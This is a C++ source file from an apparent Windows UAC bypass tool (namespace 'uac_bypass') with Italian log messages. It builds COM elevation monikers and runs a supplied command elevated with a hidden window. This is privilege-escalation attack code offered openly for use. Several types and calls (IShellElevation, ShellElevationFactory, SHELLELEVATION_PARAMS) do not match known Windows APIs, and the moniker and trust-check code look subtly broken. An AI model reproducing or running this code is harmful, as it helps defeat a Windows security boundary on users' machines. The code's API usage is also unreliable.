#include "../include/ComManager.h"
#include <wrl/client.h>
#include <shlobj.h>
#include <wintrust.h>
#include <softpub.h>
#include <vector>
#pragma comment(lib, "wintrust")

namespace uac_bypass {

ComManager::ComManager() 
    : logger(Logger::getInstance()),
      initialized(false),
      mainThreadId(GetCurrentThreadId()) {
}

ComManager::~ComManager() {
    cleanup();
}

ComManager& ComManager::getInstance() {
    static ComManager instance;
    return instance;
}

bool ComManager::initialize() {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione COM Manager");
    
    HRESULT hr = CoInitializeEx(NULL, COM_INIT_FLAGS);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        logComError(hr, L"CoInitializeEx");
        return false;
    }

    if (!setupComSecurity()) {
        cleanup();
        return false;
    }

    initialized = true;
    logger.logInfo(L"COM Manager inizializzato con successo");
    return true;
}

void ComManager::cleanup() {
    if (initialized) {
        logger.logInfo(L"Pulizia COM Manager");
        CoUninitialize();
        initialized = false;
    }
}

bool ComManager::setupComSecurity() {
    logger.logInfo(L"Configurazione sicurezza COM");
    
    HRESULT hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        COM_AUTHENTICATION_LEVEL,
        COM_IMPERSONATION_LEVEL,
        NULL,
        COM_SEC_FLAGS,
        NULL
    );

    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        logComError(hr, L"CoInitializeSecurity");
        return false;
    }

    return true;
}

bool ComManager::createElevatedCOMObject(const CLSID& clsid, IUnknown** ppUnknown) {
    if (!initialized || !ppUnknown) return false;
    
    logger.logInfo(L"Creazione oggetto COM elevato");
    
    // Verifica integrità prima della creazione
    if (VERIFY_COM_OBJECTS && !validateComServer(clsid)) {
        logger.logError(L"Validazione server COM fallita");
        return false;
    }

    // Creazione moniker di elevazione
    return createElevationMoniker(clsid, ppUnknown);
}

bool ComManager::createElevationMoniker(const CLSID& clsid, IUnknown** ppUnknown) {
    std::wstring monikerName = COM_ELEVATION_MONIKER;
    wchar_t clsidStr[50];
    StringFromGUID2(clsid, clsidStr, 50);
    monikerName += clsidStr;
    
    ComPtr<IBindCtx> pBindCtx;
    HRESULT hr = CreateBindCtx(0, &pBindCtx);
    CHECK_HR(hr, L"CreateBindCtx");

    // Imposta flag di elevazione
    BIND_OPTS3 bo;
    ZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    hr = pBindCtx->SetBindOptions((BIND_OPTS*)&bo);
    CHECK_HR(hr, L"SetBindOptions");

    // Crea il moniker
    ComPtr<IMoniker> pMoniker;
    hr = CreateItemMoniker(L"!", monikerName.c_str(), &pMoniker);
    CHECK_HR(hr, L"CreateItemMoniker");

    // Binding dell'oggetto
    hr = pMoniker->BindToObject(pBindCtx, NULL, IID_IUnknown, (void**)ppUnknown);
    CHECK_HR(hr, L"BindToObject");

    return true;
}

bool ComManager::executeElevated(const std::wstring& command) {
    logger.logInfo(L"Esecuzione comando elevato: " + command);
    
    ComPtr<IShellElevation> pShellElevation;
    if (!createShellElevationObject(&pShellElevation)) {
        return false;
    }

    // Prepara i parametri di esecuzione
    SHELLELEVATION_PARAMS params = { sizeof(SHELLELEVATION_PARAMS) };
    params.dwFlags = 0;
    params.lpFile = command.c_str();
    params.lpParameters = NULL;
    params.lpDirectory = NULL;
    params.nShow = SW_HIDE;

    // Esegue il comando elevato
    HRESULT hr = pShellElevation->ExecuteElevated(&params);
    if (FAILED(hr)) {
        logComError(hr, L"ExecuteElevated");
        return false;
    }

    // Verifica lo stato dell'elevazione
    DWORD status;
    hr = pShellElevation->GetElevationStatus(&status);
    if (FAILED(hr)) {
        logComError(hr, L"GetElevationStatus");
        return false;
    }

    return status == 0; // 0 indica successo
}

bool ComManager::createShellElevationObject(IShellElevation** ppShellElevation) {
    if (!ppShellElevation) return false;

    HRESULT hr = ShellElevationFactory::CreateInstance(ppShellElevation);
    if (FAILED(hr)) {
        logComError(hr, L"CreateInstance ShellElevation");
        return false;
    }

    return true;
}

bool ComManager::verifyComSecurity() {
    logger.logInfo(L"Verifica sicurezza COM");
    
    // Verifica processo corrente
    if (!checkProcessTrust(L"")) {
        logger.logError(L"Verifica processo corrente fallita");
        return false;
    }

    // Verifica impostazioni di sicurezza COM usando approccio alternativo
    HRESULT hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        COM_AUTHENTICATION_LEVEL,
        COM_IMPERSONATION_LEVEL,
        NULL,
        EOAC_DYNAMIC_CLOAKING,
        NULL
    );

    // RPC_E_TOO_LATE è accettabile se la sicurezza è già stata inizializzata
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        logComError(hr, L"Verifica sicurezza COM fallita");
        return false;
    }

    logger.logInfo(L"Verifica sicurezza COM completata");

    return true;
}

bool ComManager::checkComIntegrity() {
    logger.logInfo(L"Verifica integrità COM");
    
    // Verifica runtime COM
    HMODULE hOle32 = GetModuleHandleW(L"ole32.dll");
    if (!hOle32) {
        logger.logError(L"ole32.dll non trovata");
        return false;
    }

    // Verifica servizio COM
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        logger.logError(L"Accesso SCM fallito");
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, L"COM+ System Application", 
                                    SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        logger.logError(L"Servizio COM+ non accessibile");
        return false;
    }

    SERVICE_STATUS status;
    if (!QueryServiceStatus(hService, &status) || 
        status.dwCurrentState != SERVICE_RUNNING) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        logger.logError(L"Servizio COM+ non in esecuzione");
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool ComManager::checkProcessTrust(const std::wstring& processPath) {
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = processPath.empty() ? NULL : processPath.c_str();

    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;

    LONG result = WinVerifyTrust(NULL, &actionId, &trustData);
    
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);

    return result == ERROR_SUCCESS;
}

bool ComManager::validateComServer(const CLSID& clsid) {
    wchar_t clsidStr[50];
    StringFromGUID2(clsid, clsidStr, 50);
    
    std::wstring keyPath = COM_REG_PATH;
    keyPath += L"\\";
    keyPath += clsidStr;
    keyPath += L"\\InprocServer32";

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CLASSES_ROOT, keyPath.c_str(), 0, 
                      KEY_READ, &hKey) != ERROR_SUCCESS) {
        logger.logError(L"Chiave registro COM non trovata: " + keyPath);
        return false;
    }

    // Prima query per ottenere la dimensione necessaria
    DWORD type = REG_SZ;
    DWORD dataSize = 0;
    LONG result = RegQueryValueExW(hKey, NULL, NULL, &type, NULL, &dataSize);
    
    if (result != ERROR_SUCCESS && result != ERROR_MORE_DATA) {
        RegCloseKey(hKey);
        logger.logError(L"Errore durante la query della dimensione del valore");
        return false;
    }

    // Alloca il buffer della dimensione corretta
    std::vector<BYTE> data(dataSize);
    result = RegQueryValueExW(hKey, NULL, NULL, &type, 
                            data.data(), &dataSize);

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        logger.logError(L"Errore durante la lettura del valore");
        return false;
    }

    // Converti il buffer in wstring e verifica il percorso
    std::wstring serverPath(reinterpret_cast<wchar_t*>(data.data()));
    return checkProcessTrust(serverPath);
}

void ComManager::logComError(HRESULT hr, const std::wstring& operation) {
    _com_error err(hr);
    logger.logError(L"Errore COM in " + operation + L": " + 
                   err.ErrorMessage());
}

} // namespace uac_bypass